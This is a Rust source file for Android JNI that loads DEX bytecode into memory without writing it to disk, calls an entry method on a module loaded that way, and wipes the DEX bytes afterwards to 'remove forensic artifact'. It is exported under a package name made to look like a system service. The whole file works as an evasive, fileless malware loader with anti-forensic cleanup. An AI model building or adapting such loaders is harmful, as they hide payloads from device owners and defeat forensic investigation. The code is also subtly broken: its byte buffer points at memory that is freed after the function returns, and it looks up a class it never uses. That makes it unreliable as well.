// [context: Rust, Android ARM64 JNI, in-memory DEX loading via InMemoryDexClassLoader]

use jni::JNIEnv;
use jni::objects::{JClass, JObject, JValue, JByteArray};
use jni::sys::jobject;
use std::ptr;

/// Loads a DEX byte slice into a new InMemoryDexClassLoader without touching disk.
/// Returns the ClassLoader jobject.
pub unsafe fn load_dex_in_memory<'a>(
    env: &mut JNIEnv<'a>,
    dex_bytes: &[u8],
) -> Result<JObject<'a>, String> {
    // Create a Java ByteBuffer wrapping our bytes
    let byte_buf = env
        .new_direct_byte_buffer(dex_bytes.as_ptr() as *mut u8, dex_bytes.len())
        .map_err(|e| e.to_string())?;

    // Get parent ClassLoader (app's own ClassLoader)
    let context_class = env
        .find_class("android/content/Context")
        .map_err(|e| e.to_string())?;

    // Construct InMemoryDexClassLoader(ByteBuffer dexBuffer, ClassLoader parent)
    let imdcl_class = env
        .find_class("dalvik/system/InMemoryDexClassLoader")
        .map_err(|e| e.to_string())?;

    // We pass null for parent ClassLoader to use bootstrap loader
    let loader = env
        .new_object(
            imdcl_class,
            "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V",
            &[
                JValue::Object(&byte_buf),
                JValue::Object(&JObject::null()),
            ],
        )
        .map_err(|e| e.to_string())?;

    Ok(loader)
}

/// Invokes a static method on a class loaded from the given InMemoryDexClassLoader.
pub unsafe fn invoke_module_entry<'a>(
    env: &mut JNIEnv<'a>,
    class_loader: &JObject<'a>,
    class_name: &str,
    method: &str,
    sig: &str,
    args: &[JValue<'a, '_>],
) -> Result<JObject<'a>, String> {
    // loadClass(className)
    let class_name_jstr = env.new_string(class_name).map_err(|e| e.to_string())?;
    let loaded_class = env
        .call_method(
            class_loader,
            "loadClass",
            "(Ljava/lang/String;)Ljava/lang/Class;",
            &[JValue::Object(&class_name_jstr)],
        )
        .map_err(|e| e.to_string())?
        .l()
        .map_err(|e| e.to_string())?;

    let class = JClass::from(loaded_class.as_ref());

    let result = env
        .call_static_method(class, method, sig, args)
        .map_err(|e| e.to_string())?;

    Ok(result.l().unwrap_or(JObject::null()))
}

/// Zero out DEX memory after execution to remove forensic artifact.
pub unsafe fn zero_dex_memory(dex_ptr: *mut u8, len: usize) {
    // volatile writes to prevent compiler optimization
    for i in 0..len {
        ptr::write_volatile(dex_ptr.add(i), 0u8);
    }
    // memory fence
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

#[no_mangle]
pub unsafe extern "C" fn Java_com_system_service_jni_NativeBridge_loadDexInMemory(
    mut env: JNIEnv,
    _class: JClass,
    dex_array: JByteArray,
) -> jobject {
    let dex_bytes = match env.convert_byte_array(&dex_array) {
        Ok(b) => b,
        Err(_) => return ptr::null_mut(),
    };

    match load_dex_in_memory(&mut env, &dex_bytes) {
        Ok(loader) => loader.into_raw(),
        Err(_) => ptr::null_mut(),
    }
}
